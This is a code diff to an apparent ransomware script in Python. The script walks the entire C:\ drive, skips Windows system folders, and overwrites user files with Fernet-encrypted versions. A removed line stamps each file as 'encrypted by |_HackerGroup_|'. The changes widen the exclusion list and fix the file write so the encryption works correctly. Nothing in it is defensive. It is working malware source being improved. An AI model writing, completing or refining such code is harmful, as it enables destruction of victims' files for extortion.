@@ -7,12 +7,16 @@ root_dir = "C:\\"
 
 def get_all_files(root_dir):
     all_files = []
-    excluded_dir = ["System32", "Windows", "Program Files", "AppData", "ProgramData", "$Recycle.Bin", "System Volume Information",
-                    "Boot", "Fonts", "Logs", "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
-                    "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS", "Common Files", "Default User", "Default", "Public"]
+    excluded_dir = [
+        "System32", "Windows", "Program Files", "AppData", "ProgramData",
+        "$Recycle.Bin", "System Volume Information", "Boot", "Fonts", "Logs",
+        "PolicyDefinitions", "Prefetch", "System", "config", "drivers",
+        "DriverStore", "Logfiles", "spool", "SysWOW64", "Temp", "WinSxS",
+        "Common Files", "Default User", "Default", "Public", "Program Files (x86)"
+        ]
     for dirpath, dirnames, filenames in os.walk(root_dir):
         #Exclude some directories
-        dirnames[:] = [d for d in dirnames if d not in excluded_dir]
+        dirnames[:] = [d for d in dirnames if os.path.join(dirpath, d).split(os.sep)[-1]not in excluded_dir]
 
         for filename in filenames:
             full_path = os.path.join(dirpath, filename)
@@ -37,7 +41,7 @@ for file in files:
         #Encrypt data
         encryptedContent = fernet.encrypt(contentOfFiles)
         with open(file, "wb") as theFile:
-            theFile.write(f"{encryptedContent}\n File has been encrypted by |_HackerGroup_|")
+            theFile.write(encryptedContent)
         print(f"Encrypted {file}")
     except Exception as e:
         print(f"Failed to encrypt {file}: {e}")
